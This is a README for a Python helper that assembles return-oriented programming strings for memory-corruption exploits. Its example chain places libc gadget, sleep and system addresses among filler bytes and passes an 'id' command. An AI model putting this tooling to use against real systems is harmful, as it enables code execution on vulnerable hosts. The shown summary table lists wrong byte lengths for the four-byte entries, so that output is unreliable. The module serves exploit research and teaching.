# ropgen
A python module to facilitate in the generation of rop strings.

After we have found out the gadgets which will be used in the rop string we need to lay out them. 
The gadgets needs be placed at specific offsets within the rop string with junk bytes separating them.

This python module assists in the creation of such rop strings. You can build the rop string by specifying
the offsets and the value that will be placed at that offset. A value can be a byte, word, double word, quad word or string.

Additionally, you can summarize the generated rop string in the form of a nice ascii table. For this to work, you need to have,
[texttable](https://github.com/foutaise/texttable) installed.

# Example

```python
from ropgen import RopGen

libc = 0x2ab3e000
gadget1 = 0x27eb4
sleep = 0x2f2b0
system = 0x2bfd0
gadget2 = 0x267b0
gadget3 = 0x171cc

rop = RopGen()
rop.set_dword(51, libc + gadget1, "Gadget 1")
rop.set_dword(158, libc + sleep, "sleep")
rop.set_dword(170, libc + system, "system")
rop.set_dword(194, libc + gadget2, "Gadget 2")
rop.set_dword(226, libc + gadget3, "Gadget 3")
rop.set_string(254, "id; \x00", "Payload")

print rop.build()
print
rop.summarize()
```

**Output**

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�^�*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�Ҷ*AAAAAAAAП�*AAAAAAAAAAAAAAAAAAAA�G�*AAAAAAAAAAAAAAAAAAAAAAAAAAAA�Q�*AAAAAAAAAAAAAAAAAAAAAAAAid; 

+--------+---------------------+-----------------+
| Offset | Content description | Length in bytes |
+========+=====================+=================+
| 0      | Filler Bytes        |       51        |
+--------+---------------------+-----------------+
| 51     | Gadget 1            |       47        |
+--------+---------------------+-----------------+
| 55     | Filler Bytes        |       103       |
+--------+---------------------+-----------------+
| 158    | sleep               |       154       |
+--------+---------------------+-----------------+
| 162    | Filler Bytes        |        8        |
+--------+---------------------+-----------------+
| 170    | system              |       166       |
+--------+---------------------+-----------------+
| 174    | Filler Bytes        |       20        |
+--------+---------------------+-----------------+
| 194    | Gadget 2            |       190       |
+--------+---------------------+-----------------+
| 198    | Filler Bytes        |       28        |
+--------+---------------------+-----------------+
| 226    | Gadget 3            |       222       |
+--------+---------------------+-----------------+
| 230    | Filler Bytes        |       24        |
+--------+---------------------+-----------------+
| 254    | Payload             |       249       |
+--------+---------------------+-----------------+
```

# License

Licensed under MIT.
